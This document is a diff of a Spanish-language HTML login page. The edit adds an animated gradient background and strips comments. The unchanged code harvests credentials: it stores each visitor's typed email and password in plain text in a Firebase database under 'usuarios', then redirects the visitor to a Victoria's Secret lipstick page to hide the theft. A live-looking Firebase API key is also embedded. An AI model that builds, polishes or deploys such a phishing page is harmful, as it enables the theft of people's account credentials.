@@ -9,13 +9,24 @@
     body { 
       margin: 0; 
       font-family: 'Poppins', sans-serif; 
-      background: linear-gradient(135deg, #89f7fe, #66a6ff); 
       display: flex; 
       justify-content: center; 
       align-items: center; 
       min-height: 100vh; 
-      flex-direction: column; 
+      flex-direction: column;
+
+      /* Fondo degradado animado tipo ola */
+      background: linear-gradient(-45deg, #89f7fe, #66a6ff, #fbc2eb, #a18cd1);
+      background-size: 400% 400%;
+      animation: gradientMove 8s ease infinite;
     }
+
+    @keyframes gradientMove {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
+    }
+
     .login-box { 
       background: white; 
       padding: 40px; 
@@ -59,7 +70,6 @@
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js";
     import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-analytics.js";
 
-    // Nueva configuración de Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyCIBiJXgLo-_9spj_YECcr2i95w88zpnZ8",
       authDomain: "project-3593887432327561826.firebaseapp.com",
@@ -70,7 +80,6 @@
       measurementId: "G-43T3NQJ1D6"
     };
 
-    // Inicializar Firebase
     const app = initializeApp(firebaseConfig);
     const analytics = getAnalytics(app);
     const db = getDatabase(app);
@@ -83,13 +92,11 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-      // Guardar en la DB
       push(ref(db, "usuarios"), {
         email: email,
         password: password,
         fecha: new Date().toLocaleString()
       }).then(() => {
-        // Redirigir al enlace de labiales de Victoria's Secret después de guardar
         window.location.href = "https://www.victoriassecretbeauty.gt/labiales?srsltid=AfmBOoo2_GxIY1cl2nZ2CsCl6SQLnFRbuxZ9361fBPAY0qZHHPJQjaKH";
       }).catch((error) => {
         alert("Error al guardar: " + error.message);
@@ -107,5 +114,6 @@
   </script>
 </body>
 </html>
+
 
 
